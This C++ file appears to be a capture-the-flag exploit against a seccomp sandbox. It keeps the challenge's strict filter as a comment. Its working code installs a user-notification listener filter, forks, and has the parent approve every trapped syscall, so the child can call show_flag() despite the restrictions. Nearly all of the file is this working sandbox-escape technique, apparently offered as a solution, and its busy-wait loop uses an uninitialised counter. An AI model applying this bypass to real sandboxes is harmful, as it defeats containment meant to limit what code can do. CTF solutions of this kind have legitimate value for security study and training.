#include <seccomp.h>
#include <unistd.h>
#include <syscall.h>
#include <iostream>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <string.h>
#include <sys/ioctl.h>


extern "C" {
extern void show_flag();
}
using namespace std;

int main(){

    // // challenge setting
    // struct sock_filter strict_filter[] = {
    //     BPF_STMT(BPF_LD | BPF_W | BPF_ABS,offsetof(struct seccomp_data, nr)),
    //     BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, 0, 1),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
	// 	BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_fork, 0, 1),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
	// 	BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ioctl, 0, 1),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
	// 	BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 0, 1),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    //     BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
    // };
    // struct sock_fprog prog = {
    //     .len = sizeof(strict_filter) / sizeof(strict_filter[0]),
    //     .filter = strict_filter,
    // };
    // syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS,1,0,0,0);
    // syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,0,&prog);

    // --- exp --- 
	struct sock_filter exp_filter[] = {
		BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, arch)),
		BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
		BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_USER_NOTIF),
		BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
	};

    struct sock_fprog exp_prog = {
        .len = sizeof(exp_filter) / sizeof(exp_filter[0]),
        .filter = exp_filter,
    };
	// Use seccom to create a listener
	
	int fd = syscall(317,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER ,&exp_prog);
	
    if(fd==3)
	{
		int pid = syscall(__NR_fork);
		if(pid)
		{

		    struct seccomp_notif req={};
           	struct seccomp_notif_resp resp={};
			
			
			while(1){

				memset(&req,0,sizeof(struct seccomp_notif));
				memset(&resp,0,sizeof(struct seccomp_notif_resp));
				syscall(__NR_ioctl,fd, SECCOMP_IOCTL_NOTIF_RECV, &req);
				resp.id = req.id;
				resp.flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE; // allow all the syscalls
				syscall(__NR_ioctl,fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
			}

		}
		else if(pid==0){
			for(int i; i<0x100000;i++)
				;//waite for parent's work to be finished
			show_flag();
			
		}
		else{
			_Exit(-123);
		}

	}
	else
		_Exit(-1);

    
}
